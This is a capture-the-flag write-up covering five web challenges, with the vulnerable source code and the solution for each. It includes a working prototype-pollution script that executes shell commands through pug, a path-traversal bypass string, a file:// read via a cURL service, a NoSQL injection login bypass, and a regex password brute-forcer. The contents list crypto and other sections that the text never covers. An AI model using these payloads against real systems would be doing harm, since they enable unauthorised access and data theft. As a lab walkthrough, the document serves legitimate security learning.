# DarkCTF Writeups
Author: [Gallifrey](https://github.com/gall1frey)

### Contents
- [Web](#web)
    - [Inspector Gadget](#inspectorGadget)
    - [BlitzProp](#blitzProp)
    - [MiniSTRyplace](#miniSTRyplace)
    - [Caas](#caas)
    - [Wild Goose Hunt](#wildGooseHunt)
- [Crypto](#crypto)
    - [Nintendo Base64](#nintendoBase64)
    - [Phase Stream 1](#phaseStream1)
    - [Phase Stream 2](#phaseStream2)
    - [Phase Stream 3](#phaseStream3)
    - [Phase Stream 4](#phaseStream4)
    - [SoulCrabber](#soulCrabber)
    - [SoulCrabber2](#soulCrabber2)
- [Reversing](#rev)
    - [Authenticator](#authenticator)
    - [Passphrase](#passphrase)
- [Forensics](#forensics)
    - [Key mission](#keyMission)
    - [Invitation](#invitation)
    - [AlienPhish](#alienPhish)
- [Hardware](#hardware)
    - [Serial Logs](#serialLogs)
    - [Compromised](#compromised)
    - [Secure](#secure)
    - [Off The Grid](#offTheGrid)
- [Misc](#misc)
    - [Alien Camp](#alienCamp)
    - [Input as a Service](#inputAsAService)
    


# Web<a name="web"></a>
## Inspector Gadget<a name="inspectorGadget"></a>
### Solution
Was a very simple web chall. 
The web page already had the first part of the flag, ```CHTB{```. Viewing the source code got usthe next part, ```1nsp3ction_```.
Checking out the css file, we get the third part, ```c4n_r3ve4l```. Finally, checking out the main.js file gives us the last piece: ```us3full_1nf0rm4tion}```.

The flag is:
```
CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}
```

## BlitzProp<a name="blitzProp"></a>
```
A tribute page to the legendary alien band called BlitzProp!
```
The challenge came with the source code, ```web_blitzprop.zip```

On starting the docker container, we are greeted with a web page that asks us to enter a favourite song. If the entered field isn't a name of one of the songs listed, we get a response saying ```Please provide us with the name of an existing song.```

### Solution
Looking at the source code that handles this:
```javascript
router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { song } = unflatten(req.body);

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});
```
We can see that the input is only being checked to see if it _contains_ that string. It means we can append other stuff to our input and it won't make a difference. 
Also, there is another line worth noting:
```javascript 'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })```
pug.compile converts a string into a template function and executes it. This is vulnerable. We can use AST injection to execute remote code. Also, according to the zip file, the file containing the flag is called ```flag```.

The attack:
```python
import requests

TARGET_URL = '<url of the target>'

# make pollution
r=requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('cat flag* > views/index.html')"
    }
})
# execute
print(requests.get(TARGET_URL).text)
```
The first part of the script overwrites ```index.html``` with the contents of the file ```flag```. So the next time we access ```index.html```, it prints out the contents of the file ```flag```.
```
CHTB{p0llute_with_styl3}
```

## MiniSTRyplace<a name="miniSTRyplace"></a>
```
Let's read this website in the language of Aliens. Or maybe not?
```
The challenge came with the source code, ```web_ministryplace.zip```
### Solution
On starting the docker container, we get ourselves a web page where you can choose the language. On checking out the source code file, index.php, we find something interesting:
```php
<html>
    <header>
        <meta name='author' content='bertolis, makelaris'>
        <title>Ministry of Defence</title>
        <link rel="stylesheet" href="/static/css/main.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
    </header>

    <body>
    <div class="language">
        <a href="?lang=en.php">EN</a>
        <a href="?lang=qw.php">QW</a>
    </div>

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html>
```
More importantly, the part 
```php  
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : 
```
It basically gives us the file that maches the name set by ```lang```. We only have to specify the name of the flag file in ```lang```. 
But note that php replaces any string matching ```../``` with an empty string. 
So to get the contents of the file ```../../flag```, we'll have to set lang as ```....//....//flag```.
Sending a GET request with ```lang=....//....//flag```, we get the flag.

The flag is:
```
MiniSTRyPlace: CHTB{b4d_4li3n_pr0gr4m1ng}
```

## CaaS<a name="caas"></a>
```
cURL As A Service, or CAAS is a brand new Alien Application, built so that humans can test the status of their websites. However, it seems that the aliens have not quite got the hang of Human Programming and the application is riddled with issues.
```
The challenge came with the source code, ```web_caas.zip```
### Solution
On starting the docker, we get ourselves a web page where we enter a url, and the server returns the output of the curl command run for that url. There is also a check to see if the input is a valid url, but it is done on the client side, and can easily be bypassed.

On checking the source code, we have:
```php
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
```
The escapeshellcmd() function escapes any possible characters that can be used to run shell commands. There are some bypasses for it, but it won't be necessary for this challenge. 
We can simply get the flag by passing ```file:///../../flag``` as input.
cURLing on the server's own fileserver gets us the flag.

The flag is:
```
CHTB{f1le_r3trieval_4s_a_s3rv1ce}
```

## Wild Goose Hunt<a name="wildGooseHunt"></a>
```
Outdated Aliwn technology has been found by the human resistance. The system may contain sensitive information thet could be of use to us. Our experts are trying to find a way into the system. Can you help?
```
The challenge came with the source code, ```web_wild_goose_hunt.zip```
### Solution
On starting the docker, and browsing it, we are asked for username and password.
The source code tells us that MongoDB is used. So NoSQL injection looks like a good start.

Intercepting the login response, we see that it looks like this:
```username=user&password=pass```
Trying a simple payload:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""} }
```
This returns the message: ```{"logged":1,"message":"Login Successful, welcome back admin."}```
Now we know there's a user called admin.

We'll now have to guess the password. Writing a python script to do that:
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://138.68.185.219:30775/api/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c.isalnum() or c == '_' or c == '}':
            payload='{"username": {"$eq":"'+username+'"}, "password": {"$regex": "^'+password+c+'" }}'
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if '1' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```
([Reference](https://book.hacktricks.xyz/pentesting-web/nosql-injection))
The flag is:
```
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
```

